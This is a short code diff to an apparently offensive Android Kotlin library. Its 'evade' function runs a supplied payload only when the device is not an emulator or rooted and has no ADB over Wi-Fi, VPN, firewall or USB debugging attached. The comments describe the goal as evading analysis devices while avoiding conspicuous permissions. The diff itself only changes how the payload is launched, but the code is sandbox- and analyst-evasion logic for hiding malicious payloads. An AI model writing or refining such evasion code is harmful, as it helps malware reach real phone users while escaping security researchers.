@@ -29,6 +29,7 @@ import androidx.annotation.RequiresApi
 import com.scottyab.rootbeer.RootBeer
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.async
+import kotlinx.coroutines.launch
 import java.net.NetworkInterface
 import javax.net.SocketFactory
 
@@ -75,7 +76,7 @@ check multiple conditions regarding whether it is safe in regards to cyber secur
 your payload please pass false as the argument as true is the default value. This will also return a callback for onEscape meaning it was not executed.
 Which immediately after you can register for a callback named onSuccess.*/
 //If we wanted to make this better we could check the state of the sim card(s) allowing us to evade device's without a sim card. However this will cause us to use a dangerous permission called READ_PHONE_STATE
-inline suspend fun Context.evade(scope: CoroutineScope, requiresNetwork: Boolean = true, payload: () -> Unit): OnEvade.Escape{
+inline suspend fun Context.evade(scope: CoroutineScope, requiresNetwork: Boolean = true, crossinline payload: () -> Unit): OnEvade.Escape{
     val isEmulator = scope.async { isEmulator() }
     val isRooted = scope.async { isRooted() }
     val hasAdbOverWifi = scope.async { hasAdbOverWifi() }
@@ -92,7 +93,7 @@ inline suspend fun Context.evade(scope: CoroutineScope, requiresNetwork: Boolean
         false
     }
     if( !isEmulator.await() && !isRooted.await() && !hasAdbOverWifi.await() && !isConnected.await() && !hasUsbDevices.await() && !hasVpn.await() && !hasFirewall.await()){
-        payload()
+        scope.launch { payload() }
         return OnEvade.Escape(true)
     }
     return OnEvade.Escape(false)
